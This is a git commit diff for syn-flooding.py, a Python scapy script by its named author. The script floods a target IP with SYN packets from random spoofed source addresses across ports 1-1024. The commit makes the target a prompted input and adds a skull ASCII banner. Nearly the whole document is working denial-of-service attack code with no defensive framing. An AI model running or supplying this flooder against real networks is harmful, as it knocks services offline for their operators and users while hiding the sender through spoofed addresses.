172cdb6b1848ed84cf849b5aad7245d29069c1e7
Daniel Magevski <daniel_magevski@hotmail.com>
2018-08-29 00:58:23 -0300

    Update syn-flooding.py

--- syn-flooding.py
+++ syn-flooding.py
@@ -1,4 +1,4 @@
-#!/usr/bin/Python
+#!/usr/bin/python
 # Author   : Daniel Magevski
 # Description : This scrpit will send IP packet with flag SYN on your networking with random IP source
 
@@ -7,15 +7,32 @@ import os
 from scapy.all import *
 
 if os.geteuid() != 0:
-        exit("You need to root privileges")
+        exit("You need to root prcivileges")
 
-IP_src="192.168.0.1" # Set your target
+print "####################################################################"
+print "                   WELCOME SYN FLOODING                             "
+print "                    BY DANIEL MAGEVSKI                              "
+print "                     .-.      .-.                                   "
+print "                    /            \                                  "
+print "                   |              |                                 "
+print "                   | )(|_/  \|_)( |                                 "
+print "                   |/     /\     \|                                 "
+print "           _       (_     ^^     _)                                 "
+print "   _\ ____) \_______\__|IIIIII|__/_______________________________   "
+print "  (_)[___]{}<________|-\IIIIII/-|________________________________/  "
+print "    /     )_/        \          /                                   "
+print "                      \ ______ /                                    "
+print "####################################################################"
+
+print " [*] Ex 192.168.0.1"
+IP_dst = raw_input(" Set IP target: ")
 
 packet = IP(src=RandIP("*.*.*.*"),
-            dst=IP_src) / \
+            dst=IP_dst) / \
          TCP(dport=range(1,1024), flags="S")
 
-print "\nPress Crtl+C to stop\n"
-print "Flooding target \n" + IP_src
+print " Press Crtl+C to stop\n"
+print " Flooding target " + IP_dst
 
+#Sending the packet
 srflood(packet)
